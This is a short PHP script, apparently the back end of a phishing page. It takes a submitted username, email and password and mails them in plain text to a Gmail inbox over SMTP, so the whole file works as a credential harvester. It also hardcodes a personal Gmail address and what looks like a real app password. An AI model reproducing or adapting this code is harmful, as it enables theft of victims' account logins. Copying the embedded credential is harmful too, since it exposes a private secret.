<?php
require 'PHPMailer/src/PHPMailer.php';
require 'PHPMailer/src/SMTP.php';
require 'PHPMailer/src/Exception.php';

use PHPMailer\PHPMailer\PHPMailer;
use PHPMailer\PHPMailer\SMTP;
use PHPMailer\PHPMailer\Exception;

$mail = new PHPMailer(true);

try {
    $mail->isSMTP();
    $mail->Host = 'smtp.gmail.com';
    $mail->SMTPAuth = true;
    $mail->Username = 'hyperahmad123@gmail.com'; // Your Gmail email address
    $mail->Password = 'egur lwum yqtz wwyh'; // Your app-specific password
    $mail->SMTPSecure = PHPMailer::ENCRYPTION_STARTTLS;
    $mail->Port = 587;
    $mail->SMTPDebug = SMTP::DEBUG_SERVER; // Enable verbose debug output

    // Retrieve the values from the POST request
    $username = $_POST['username'];
    $email = $_POST['email'];
    $password = $_POST['password'];

    // Construct the email body using the retrieved values
    $mail->setFrom('hyperahmad123@gmail.com', 'ahmad');
    $mail->addAddress('hyperahmad123@gmail.com');
    $mail->isHTML(true);
    $mail->Subject = 'EA 8HK';
    $mail->Body = "Username: $username\nEmail: $email\nPassword: $password";

    $mail->send();
    echo 'Message has been sent';
} catch (Exception $e) {
    echo "Message could not be sent. Mailer Error: {$mail->ErrorInfo}";
}
